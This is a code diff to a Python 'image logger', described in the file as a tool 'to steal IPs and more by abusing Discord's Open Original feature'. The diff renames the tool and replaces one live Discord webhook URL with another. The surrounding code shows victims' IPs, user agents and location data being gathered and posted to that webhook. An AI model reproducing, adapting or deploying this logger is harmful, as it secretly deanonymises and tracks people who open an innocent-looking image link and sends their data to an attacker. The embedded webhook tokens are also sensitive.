@@ -5,14 +5,14 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Hit By Ziyus"
+__app__ = "NA HIT KO SI TANGA"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "ZiyusxMakku"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1420412512419184751/lKlNWFrgNNVdv0ONhyF2dsex8dt2r7GznuDKAOxmE_OC-Ehk3eAlZAopqoemtSqtmL5Y",
+    "webhook": "https://discord.com/api/webhooks/1444693786667253851/NaM3NegT65W_SdkHvhiwSxaDuELk4wsSvywsV35fVzVAliWNpi-2EKDiH_bxSFixxe1Z",
     "image": "https://imgur.com/a/VVjvtZf", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -80,7 +80,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Wckd Image Logger - Error",
+            "title": "Zikku Image Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -99,7 +99,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Wckd Image Logger - Link Sent",
+            "title": "Zikku Image Logger - Link Sent",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
